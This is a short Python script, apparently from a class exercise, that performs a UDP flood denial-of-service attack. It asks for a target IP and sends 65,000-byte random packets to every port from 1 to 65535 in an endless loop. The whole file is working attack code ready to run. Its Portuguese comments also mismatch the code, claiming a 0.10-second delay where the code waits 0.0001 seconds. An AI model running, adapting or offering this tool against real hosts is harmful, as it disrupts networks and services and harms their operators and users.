## UD FLOOD script inspired by techniques from Professor Armando Ventura, aula 5.

import socket
import random
import time
from colorama import init, Fore, Style

# Inicializa o colorama para suportar cores no terminal
init(autoreset=True)

def udp_flood():
    while True:
        ip = input(Fore.RED + "Enter target IP (or type 'q' to quit): " + Style.RESET_ALL)
        
        if ip.lower() == 'q':
            print(Fore.RED + "Exiting UDP flood operation." + Style.RESET_ALL)
            return  # Sai do loop
        
        try:
            # Cria um socket UDP (IPv4)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Gera um pacote de 65000 bytes aleatórios
            bytes = random._urandom(65000)

            sent = 0  # Contador de pacotes enviados

            # Loop para enviar pacotes continuamente
            print(Fore.YELLOW + f"Starting UDP flood attack on {ip}..." + Style.RESET_ALL)
            
            while True:
                # Envia pacotes para todas as portas de 1 a 65535
                for i in range(1, 65536):
                    port = i  # A porta de destino (variando de 1 até 65535)
                    
                    # Envia o pacote para o IP e porta específicos
                    sock.sendto(bytes, (ip, port))
                    
                    # Exibe uma mensagem a cada pacote enviado
                    print(Fore.GREEN + f"Sent {sent} packet(s) to {ip} at port {port}" + Style.RESET_ALL)
                    
                    # Incrementa o contador de pacotes enviados
                    sent += 1
                    
                    # Aguarda 0.10 segundos antes de enviar o próximo pacote
                    time.sleep(0.0001)

        except KeyboardInterrupt:
            print(Fore.YELLOW + "\nInterrupted by user. Exiting..." + Style.RESET_ALL)
            break
        except Exception as e:
            print(Fore.RED + f"An error occurred: {e}" + Style.RESET_ALL)
            break

if __name__ == "__main__":
    udp_flood()
